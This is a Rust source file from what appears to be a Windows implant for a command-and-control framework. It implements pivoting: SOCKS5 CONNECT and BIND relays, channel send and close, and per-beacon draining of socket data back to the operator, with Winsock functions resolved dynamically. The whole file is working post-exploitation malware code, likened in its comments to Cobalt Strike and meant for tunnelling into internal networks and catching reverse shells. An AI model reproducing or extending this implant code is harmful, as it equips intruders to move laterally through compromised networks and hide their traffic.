//! Pivoting (Connect / Socks / ChannelData / ChannelClose) for the Windows PIC
//! implant — a real bidirectional relay across beacon cycles.
//!
//! The beacon loop is synchronous-poll (sleep → POST → receive → execute) and
//! owns the single thread, so it can't hold a persistent connection to the
//! operator. Instead each open channel keeps a non-blocking socket in a
//! fixed-size table; every beacon cycle [`pump_channels`] drains pending socket
//! reads into `Response::Channel { status: 1, data }` frames (socket→operator)
//! and [`channel_data`] writes operator bytes onto the socket
//! (`Command::ChannelData`). Latency is one beacon interval, exactly like
//! Cobalt Strike's SOCKS over a jittered beacon.
//!
//! The SOCKS5 protocol itself is handled operator-side (the `/api/socks` bridge
//! speaks SOCKS5 to the local client and ferries raw bytes over the channel);
//! the implant only opens a raw TCP socket to the target and relays bytes.

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use crate::resolve::export_addr;
use core::ffi::c_void;
use nyx_protocol::Response;

// ---- Winsock constants ----------------------------------------------------
const AF_INET: i32 = 2;
const SOCK_STREAM: i32 = 1;
const FIONBIO: i32 = 0x8004_667Eu32 as i32;
const SOL_SOCKET: i32 = 0xFFFF;
const SO_ERROR: i32 = 0x1007;
const INVALID_SOCKET: usize = usize::MAX;
const INADDR_NONE: u32 = 0xFFFF_FFFF;
/// `WSAGetLastError` value when a non-blocking `recv` has no data ready. Any
/// other error on recv tears the channel down.
const WSAEWOULDBLOCK: i32 = 10035;

#[repr(C)]
#[derive(Clone, Copy)]
struct SockAddrIn {
    sin_family: u16,
    sin_port: u16,
    sin_addr: u32,
    sin_zero: [u8; 8],
}

#[repr(C)]
#[derive(Clone, Copy)]
struct FdSet {
    fd_count: u32,
    fd_array: [usize; 64],
}

#[repr(C)]
#[derive(Clone, Copy)]
struct Timeval {
    tv_sec: i32,
    tv_usec: i32,
}

/// One open relay channel: the server-assigned chan id + the live socket.
#[derive(Clone, Copy)]
struct Channel {
    chan: u32,
    sock: usize,
    /// True for a SOCKS BIND listener (accepts inbound connections in
    /// pump_channels). False for a connected/relay socket (recv-driven).
    listening: bool,
}

/// The channel table. Fixed-size (a relay rarely needs more than a handful) so
/// it lives in a `static` with no allocation. All access is contained to the
/// `slot_of`/`add_channel` helpers below, each `unsafe`.
const MAX_CHANNELS: usize = 16;
/// Channel table wrapped in `UnsafeCell` — all access is single-threaded
/// beacon context. The `UnsafeCell` is the minimal safe wrapper replacing
/// the previous `static mut`.
static CHANNELS: core::cell::UnsafeCell<[Option<Channel>; MAX_CHANNELS]> =
    core::cell::UnsafeCell::new([None; MAX_CHANNELS]);

/// Winsock init-once guard. `WSAStartup` is globally reference-counted; calling
/// it once per process is enough, and we never `WSACleanup` — the implant lives
/// until `Exit`, and cleanup would tear down every open channel socket.
static WSA_READY: core::sync::atomic::AtomicBool = core::sync::atomic::AtomicBool::new(false);

/// Resolve ws2_32 once + `WSAStartup`. Idempotent. Returns false if winsock
/// can't be brought up (the channel fns then all refuse to act).
unsafe fn wsa_init() -> bool {
    use core::sync::atomic::Ordering;
    if WSA_READY.load(Ordering::Acquire) {
        return true;
    }
    if !force_load(b"ws2_32.dll") {
        return false;
    }
    type WSAStartup = unsafe extern "system" fn(u16, *mut u8) -> i32;
    let Some(a) = (unsafe { export_addr(b"ws2_32.dll", b"WSAStartup") }) else {
        return false;
    };
    let startup: WSAStartup = unsafe { core::mem::transmute(a) };
    let mut wsadata = [0u8; 404];
    if unsafe { startup(0x0202, wsadata.as_mut_ptr()) } != 0 {
        return false;
    }
    WSA_READY.store(true, Ordering::Release);
    true
}

// ---- the relay fn table (send / recv / closesocket / WSAGetLastError) ------

struct RelayFns {
    send: FSend,
    recv: FRecv,
    closesocket: FClose,
    last_err: FLastError,
}
type FSend = unsafe extern "system" fn(usize, *const u8, i32, i32) -> i32;
type FRecv = unsafe extern "system" fn(usize, *mut u8, i32, i32) -> i32;
type FClose = unsafe extern "system" fn(usize) -> i32;
type FLastError = unsafe extern "system" fn() -> i32;

static mut RELAY: Option<RelayFns> = None;

/// Resolve + cache the relay fn pointers. Returns `None` if winsock or any fn
/// can't be resolved (every relay op then fails cleanly rather than crashing).
unsafe fn ensure_relay() -> Option<&'static RelayFns> {
    if unsafe { (*{ &raw const RELAY }).is_some() } {
        return unsafe { (*{ &raw const RELAY }).as_ref() };
    }
    if !unsafe { wsa_init() } {
        return None;
    }
    let s = unsafe { export_addr(b"ws2_32.dll", b"send")? };
    let r = unsafe { export_addr(b"ws2_32.dll", b"recv")? };
    let c = unsafe { export_addr(b"ws2_32.dll", b"closesocket")? };
    let e = unsafe { export_addr(b"ws2_32.dll", b"WSAGetLastError")? };
    unsafe {
        RELAY = Some(RelayFns {
            send: core::mem::transmute(s),
            recv: core::mem::transmute(r),
            closesocket: core::mem::transmute(c),
            last_err: core::mem::transmute(e),
        })
    };
    unsafe { (*{ &raw const RELAY }).as_ref() }
}

// ---- channel table helpers ------------------------------------------------

/// Index of the channel with id `chan`, if present.
unsafe fn slot_of(chan: u32) -> Option<usize> {
    for i in 0..MAX_CHANNELS {
        if let Some(c) = unsafe { (*CHANNELS.get())[i] } {
            if c.chan == chan {
                return Some(i);
            }
        }
    }
    None
}
/// Like `slot_of` but skips listening (BIND) sockets — used for data routing
/// so that operator data is never sent to a passive listener.
unsafe fn slot_of_active(chan: u32) -> Option<usize> {
    for i in 0..MAX_CHANNELS {
        if let Some(c) = unsafe { (*CHANNELS.get())[i] } {
            if c.chan == chan && !c.listening {
                return Some(i);
            }
        }
    }
    None
}

/// Insert a new channel. Returns false if the table is full (the caller closes
/// the socket — the Connect then reports a clean error instead of leaking).
unsafe fn add_channel(chan: u32, sock: usize) -> bool {
    unsafe { add_channel_kind(chan, sock, false) }
}

/// Insert a new channel with an explicit `listening` flag (true for a SOCKS
/// BIND listener that pump_channels should accept on).
unsafe fn add_channel_kind(chan: u32, sock: usize, listening: bool) -> bool {
    for i in 0..MAX_CHANNELS {
        if unsafe { (*CHANNELS.get())[i] }.is_none() {
            unsafe { (*CHANNELS.get())[i] = Some(Channel {
                chan,
                sock,
                listening,
            }) };
            return true;
        }
    }
    false
}

// ---- Connect / Socks ------------------------------------------------------

/// `Command::Connect { proto, host, port, chan }`. proto 0 = TCP (only one
/// supported). Opens a non-blocking connect with a 5s deadline; on success the
/// socket is KEPT in the channel table (not closed) and the channel reports
/// `Response::Channel { chan, status: 0 (open) }`. Subsequent bytes flow via
/// [`channel_data`] (operator→socket) and [`pump_channels`] (socket→operator).
pub fn do_connect(proto: u8, host: &str, port: u16, chan: u32) -> Response {
    if proto != 0 {
        return Response::Err({
            let mut e = String::from("connect: unsupported proto ");
            crate::fmt::push_decimal_u32(&mut e, proto as u32);
            e.push_str(" (only TCP=0)");
            e
        });
    }
    if !unsafe { wsa_init() } {
        return Response::Err(String::from("connect: winsock init failed"));
    }
    // If a channel with this id is already open (operator reused a chan id),
    // close the old one first rather than leaking the socket.
    if let Some(idx) = unsafe { slot_of(chan) } {
        if let Some(c) = unsafe { (*CHANNELS.get())[idx] } {
            if let Some(fns) = unsafe { ensure_relay() } {
                let _ = unsafe { (fns.closesocket)(c.sock) };
            }
            unsafe { (*CHANNELS.get())[idx] = None };
        }
    }

    type SocketFn = unsafe extern "system" fn(i32, i32, i32) -> usize;
    type ConnectFn = unsafe extern "system" fn(usize, *const SockAddrIn, i32) -> i32;
    type IoctlSocket = unsafe extern "system" fn(usize, i32, *mut u32) -> i32;
    type SelectFn = unsafe extern "system" fn(
        i32,
        *const FdSet,
        *const FdSet,
        *const FdSet,
        *const Timeval,
    ) -> i32;
    type InetAddr = unsafe extern "system" fn(*const u8) -> u32;
    type GetSockOpt = unsafe extern "system" fn(usize, i32, i32, *mut u8, *mut i32) -> i32;

    let socket_fn: SocketFn = match unsafe { export_addr(b"ws2_32.dll", b"socket") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("connect: socket unresolved")),
    };
    let connect_fn: ConnectFn = match unsafe { export_addr(b"ws2_32.dll", b"connect") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("connect: connect unresolved")),
    };
    let ioctlsocket: IoctlSocket = match unsafe { export_addr(b"ws2_32.dll", b"ioctlsocket") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("connect: ioctlsocket unresolved")),
    };
    let select_fn: SelectFn = match unsafe { export_addr(b"ws2_32.dll", b"select") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("connect: select unresolved")),
    };
    let inet_addr: InetAddr = match unsafe { export_addr(b"ws2_32.dll", b"inet_addr") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("connect: inet_addr unresolved")),
    };
    let getsockopt: GetSockOpt = match unsafe { export_addr(b"ws2_32.dll", b"getsockopt") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("connect: getsockopt unresolved")),
    };

    // Resolve the IPv4 (NUL-terminated for inet_addr).
    let mut hostz = [0u8; 256];
    let hn = host.as_bytes().len().min(hostz.len() - 1);
    hostz[..hn].copy_from_slice(&host.as_bytes()[..hn]);
    let addr = unsafe { inet_addr(hostz.as_ptr()) };
    if addr == INADDR_NONE {
        return Response::Err(String::from("connect: invalid IPv4 address"));
    }

    let s = unsafe { socket_fn(AF_INET, SOCK_STREAM, 0) };
    if s == INVALID_SOCKET {
        return Response::Err(String::from("connect: socket() failed"));
    }
    // Non-blocking so connect + the later relay reads never stall the loop.
    let mut mode: u32 = 1;
    let _ = unsafe { ioctlsocket(s, FIONBIO, &mut mode) };

    let sa = SockAddrIn {
        sin_family: AF_INET as u16,
        sin_port: port.swap_bytes(),
        sin_addr: addr,
        sin_zero: [0; 8],
    };
    let _ = unsafe { connect_fn(s, &sa, 16) };

    let mut fdarr = [0usize; 64];
    fdarr[0] = s;
    let wfds = FdSet {
        fd_count: 1,
        fd_array: fdarr,
    };
    let tv = Timeval {
        tv_sec: 5,
        tv_usec: 0,
    };
    let n = unsafe { select_fn(0, core::ptr::null(), &wfds, core::ptr::null(), &tv) };

    let mut ok = false;
    if n > 0 {
        let mut err: i32 = 0;
        let mut errlen: i32 = 4;
        let r = unsafe {
            getsockopt(
                s,
                SOL_SOCKET,
                SO_ERROR,
                &mut err as *mut i32 as *mut u8,
                &mut errlen,
            )
        };
        if r == 0 && err == 0 {
            ok = true;
        }
    }

    if ok {
        // Keep the socket in the channel table (the relay owns it now). If the
        // table is full, close + report rather than leak.
        if unsafe { add_channel(chan, s) } {
            return Response::Channel {
                chan,
                status: 0,
                data: Vec::new(),
            };
        }
        if let Some(fns) = unsafe { ensure_relay() } {
            let _ = unsafe { (fns.closesocket)(s) };
        }
        return Response::Err(String::from("connect: channel table full"));
    }

    // Connect failed/timed out — close + report via the cached closesocket.
    if let Some(fns) = unsafe { ensure_relay() } {
        let _ = unsafe { (fns.closesocket)(s) };
    }
    Response::Err({
        let mut e = String::from("connect ");
        e.push_str(host);
        e.push(':');
        let mut buf = [0u8; 6];
        let mut k = buf.len();
        let mut v = port as u64;
        if v == 0 {
            k -= 1;
            buf[k] = b'0';
        } else {
            while v != 0 {
                k -= 1;
                buf[k] = b'0' + (v % 10) as u8;
                v /= 10;
            }
        }
        e.push_str(core::str::from_utf8(&buf[k..]).unwrap_or("?"));
        e.push_str(": unreachable (5s)");
        e
    })
}

/// `Command::Socks { chan, op, addr, port }`:
/// - op 1 = SOCKS5 CONNECT (outbound TCP to addr:port, the common case)
/// - op 2 = SOCKS5 BIND (listen on addr:port, accept inbound — reverse shells /
///   callback receivers). The listener is kept as a `listening` channel that
///   pump_channels accepts on; each accepted peer becomes its own new channel.
/// - op 3 (UDP ASSOCIATE) is still unsupported.
/// The SOCKS5 handshake itself is handled operator-side; the implant just
/// provides the raw socket primitives and relays bytes.
pub fn do_socks(chan: u32, op: u8, addr: &str, port: u16) -> Response {
    match op {
        1 => do_connect(0, addr, port, chan),
        2 => do_bind(addr, port, chan),
        other => Response::Err({
            let mut e = String::from("socks: unsupported op ");
            crate::fmt::push_decimal_u32(&mut e, other as u32);
            e.push_str(" (connect=1, bind=2)");
            e
        }),
    }
}

/// SOCKS5 BIND (op 2): bind + listen on `addr:port`, store as a `listening`
/// channel. The first inbound connection accepted in pump_channels becomes a
/// relay channel on the SAME chan id (mirroring SOCKS5 BIND semantics where the
/// second reply carries the bound port and the first accepted peer is the
/// connection). Returns `Channel { chan, status: 0 (open/listening) }`.
fn do_bind(addr: &str, port: u16, chan: u32) -> Response {
    if !unsafe { wsa_init() } {
        return Response::Err(String::from("bind: winsock init failed"));
    }
    // Refuse to overwrite an existing channel on the same id.  A BIND on an
    // already-bound chan id is a protocol error (the operator should
    // ChannelClose it first).  Silently replacing the old socket leaks it.
    if unsafe { slot_of(chan) }.is_some() {
        return Response::Err(String::from("bind: channel already bound"));
    }

    type SocketFn = unsafe extern "system" fn(i32, i32, i32) -> usize;
    type BindFn = unsafe extern "system" fn(usize, *const SockAddrIn, i32) -> i32;
    type ListenFn = unsafe extern "system" fn(usize, i32) -> i32;
    type IoctlSocket = unsafe extern "system" fn(usize, i32, *mut u32) -> i32;
    type InetAddr = unsafe extern "system" fn(*const u8) -> u32;

    let socket_fn: SocketFn = match unsafe { export_addr(b"ws2_32.dll", b"socket") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("bind: socket unresolved")),
    };
    let bind_fn: BindFn = match unsafe { export_addr(b"ws2_32.dll", b"bind") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("bind: bind unresolved")),
    };
    let listen_fn: ListenFn = match unsafe { export_addr(b"ws2_32.dll", b"listen") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("bind: listen unresolved")),
    };
    let ioctlsocket: IoctlSocket = match unsafe { export_addr(b"ws2_32.dll", b"ioctlsocket") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("bind: ioctlsocket unresolved")),
    };
    let inet_addr: InetAddr = match unsafe { export_addr(b"ws2_32.dll", b"inet_addr") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Response::Err(String::from("bind: inet_addr unresolved")),
    };

    // Resolve the bind address. Empty/0.0.0.0/INADDR_ANY → bind all interfaces.
    let ip = if addr.is_empty() {
        0u32 // INADDR_ANY
    } else {
        let mut hostz = [0u8; 256];
        let hn = addr.as_bytes().len().min(hostz.len() - 1);
        hostz[..hn].copy_from_slice(&addr.as_bytes()[..hn]);
        let a = unsafe { inet_addr(hostz.as_ptr()) };
        if a == INADDR_NONE {
            0u32 // fall back to INADDR_ANY on bad addr
        } else {
            a
        }
    };

    let s = unsafe { socket_fn(AF_INET, SOCK_STREAM, 0) };
    if s == INVALID_SOCKET {
        return Response::Err(String::from("bind: socket() failed"));
    }
    // SO_REUSEADDR so re-binding after a close doesn't sit in TIME_WAIT.
    type SetSockOpt = unsafe extern "system" fn(usize, i32, i32, *const u8, i32) -> i32;
    if let Some(a) = unsafe { export_addr(b"ws2_32.dll", b"setsockopt") } {
        let sso: SetSockOpt = unsafe { core::mem::transmute(a) };
        let on: u32 = 1;
        const SOL_SOCKET: i32 = 0xFFFF;
        const SO_REUSEADDR: i32 = 0x0004;
        let _ = unsafe {
            sso(
                s,
                SOL_SOCKET,
                SO_REUSEADDR,
                &on as *const u32 as *const u8,
                4,
            )
        };
    }
    let sa = SockAddrIn {
        sin_family: AF_INET as u16,
        sin_port: port.to_be(),
        sin_addr: ip,
        sin_zero: [0; 8],
    };
    const SOCKET_ERROR: i32 = -1;
    let close = |sock: usize| {
        if let Some(fns) = unsafe { ensure_relay() } {
            let _ = unsafe { (fns.closesocket)(sock) };
        }
    };
    if unsafe { bind_fn(s, &sa, 16) } == SOCKET_ERROR {
        close(s);
        return Response::Err(String::from("bind: bind() failed (port in use?)"));
    }
    // backlog 1 — SOCKS5 BIND expects a single callback connection.
    if unsafe { listen_fn(s, 1) } == SOCKET_ERROR {
        close(s);
        return Response::Err(String::from("bind: listen() failed"));
    }
    // Non-blocking so accept in pump_channels never stalls the beacon loop.
    let mut mode: u32 = 1;
    let _ = unsafe { ioctlsocket(s, FIONBIO, &mut mode) };

    if !unsafe { add_channel_kind(chan, s, true) } {
        close(s);
        return Response::Err(String::from("bind: channel table full"));
    }
    Response::Channel {
        chan,
        status: 0,
        data: Vec::new(),
    }
}

// ---- ChannelData / ChannelClose / pump ------------------------------------

/// `Command::ChannelData { chan, data }` — write `data` to the channel's socket
/// (operator→target). Returns `Ok` on full write; on a send error the channel
/// is torn down and a `Channel { status: 3 (error) }` is returned so the
/// operator stops feeding it.
pub fn channel_data(chan: u32, data: &[u8]) -> Response {
    let Some(fns) = (unsafe { ensure_relay() }) else {
        return Response::Err(String::from("channel_data: winsock unresolved"));
    };
    let Some(idx) = (unsafe { slot_of_active(chan) }) else {
        return Response::Err(String::from("channel_data: unknown channel"));
    };
    let Some(c) = (unsafe { (*CHANNELS.get())[idx] }) else {
        return Response::Err(String::from("channel_data: unknown channel"));
    };
    // send() may partial-write; loop until all bytes flush or it errors. A
    // non-blocking send that WOULDBLOCKs (send buffer full) is treated as a hard
    // error here — data integrity over keeping a congested channel. The operator
    // can reconnect.
    let mut sent = 0usize;
    while sent < data.len() {
        let n = unsafe { (fns.send)(c.sock, data[sent..].as_ptr(), (data.len() - sent) as i32, 0) };
        if n <= 0 {
            let _ = unsafe { (fns.closesocket)(c.sock) };
            unsafe { (*CHANNELS.get())[idx] = None };
            return Response::Channel {
                chan,
                status: 3,
                data: Vec::new(),
            };
        }
        sent += n as usize;
    }
    Response::Ok
}

/// `Command::ChannelClose { chan }` — close the socket + drop it from the
/// table. Idempotent (unknown chan → Ok).
pub fn channel_close(chan: u32) -> Response {
    if let Some(fns) = unsafe { ensure_relay() } {
        if let Some(idx) = unsafe { slot_of(chan) } {
            if let Some(c) = unsafe { (*CHANNELS.get())[idx] } {
                let _ = unsafe { (fns.closesocket)(c.sock) };
                unsafe { (*CHANNELS.get())[idx] = None };
            }
        }
    }
    Response::Ok
}

/// Non-blocking accept on a listening socket. Returns Some(peer_fd) if a
/// connection was accepted, None if no connection is pending (or accept
/// failed). The peer socket is set non-blocking before returning so the relay
/// recv loop never stalls.
unsafe fn try_accept(listener: usize) -> Option<usize> {
    type AcceptFn = unsafe extern "system" fn(usize, *mut SockAddrIn, *mut i32) -> usize;
    type IoctlSocket = unsafe extern "system" fn(usize, i32, *mut u32) -> i32;
    let accept_fn: AcceptFn = match unsafe { export_addr(b"ws2_32.dll", b"accept") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return None,
    };
    let mut addr = SockAddrIn {
        sin_family: 0,
        sin_port: 0,
        sin_addr: 0,
        sin_zero: [0; 8],
    };
    let mut addrlen: i32 = 16;
    let peer = unsafe { accept_fn(listener, &mut addr, &mut addrlen) };
    if peer == INVALID_SOCKET {
        return None;
    }
    // Set the accepted peer non-blocking.
    if let Some(a) = unsafe { export_addr(b"ws2_32.dll", b"ioctlsocket") } {
        let ioctlsocket: IoctlSocket = unsafe { core::mem::transmute(a) };
        let mut mode: u32 = 1;
        let _ = unsafe { ioctlsocket(peer, FIONBIO, &mut mode) };
    }
    Some(peer)
}

/// Drain every open channel's socket into `Response::Channel` frames for this
/// beacon cycle. Called once per cycle by the beacon loop (before the POST).
/// Per channel: `recv` non-blocking → `status: 1 (data)` with the bytes; `0`
/// (peer EOF) → `status: 2 (closed)` + teardown; an error other than
/// WSAEWOULDBLOCK → `status: 3 (error)` + teardown. WOULDBLOCK → leave open.
pub fn pump_channels() -> Vec<Response> {
    let mut out: Vec<Response> = Vec::new();
    let Some(fns) = (unsafe { ensure_relay() }) else {
        return out;
    };
    let mut buf = [0u8; 4096];
    let mut i = 0;
    while i < MAX_CHANNELS {
        let entry = unsafe { (*CHANNELS.get())[i] };
        let Some(c) = entry else {
            i += 1;
            continue;
        };
        // A listening channel (SOCKS BIND) is accept-driven, not recv-driven.
        // Try a non-blocking accept; on a new peer, the listener stays open and
        // the accepted socket becomes a normal relay channel on the SAME chan.
        if c.listening {
            let accepted = unsafe { try_accept(c.sock) };
            if let Some(peer) = accepted {
                // Reuse the listener's chan id for the accepted peer (SOCKS5
                // BIND: the first accepted connection IS the relay). If the
                // table is full, drop the peer.
                if unsafe { add_channel_kind(c.chan, peer, false) } {
                    out.push(Response::Channel {
                        chan: c.chan,
                        status: 0,
                        data: Vec::new(),
                    });
                } else {
                    let _ = unsafe { (fns.closesocket)(peer) };
                }
            }
            i += 1;
            continue;
        }
        let n = unsafe { (fns.recv)(c.sock, buf.as_mut_ptr(), buf.len() as i32, 0) };
        if n > 0 {
            let data: Vec<u8> = buf[..n as usize].to_vec();
            out.push(Response::Channel {
                chan: c.chan,
                status: 1,
                data,
            });
            i += 1;
        } else if n == 0 {
            // Peer closed the connection cleanly.
            let _ = unsafe { (fns.closesocket)(c.sock) };
            unsafe { (*CHANNELS.get())[i] = None };
            out.push(Response::Channel {
                chan: c.chan,
                status: 2,
                data: Vec::new(),
            });
            i += 1;
        } else {
            // SOCKET_ERROR: WOULDBLOCK = nothing to read (keep open); else tear down.
            let err = unsafe { (fns.last_err)() };
            if err == WSAEWOULDBLOCK {
                i += 1;
            } else {
                let _ = unsafe { (fns.closesocket)(c.sock) };
                unsafe { (*CHANNELS.get())[i] = None };
                out.push(Response::Channel {
                    chan: c.chan,
                    status: 3,
                    data: Vec::new(),
                });
                i += 1;
            }
        }
    }
    out
}

// ---- shared helpers -------------------------------------------------------

/// Force-load ws2_32.dll (not loaded by default). Mirrors recon.rs's force_load.
fn force_load(dll: &[u8]) -> bool {
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let addr = match unsafe { export_addr(b"kernel32.dll", b"LoadLibraryA") } {
        Some(a) => a,
        None => return false,
    };
    let mut name = [0u8; 32];
    let n = dll.len().min(name.len() - 1);
    name[..n].copy_from_slice(&dll[..n]);
    let load: LoadLibraryA = unsafe { core::mem::transmute(addr) };
    !unsafe { load(name.as_ptr()) }.is_null()
}

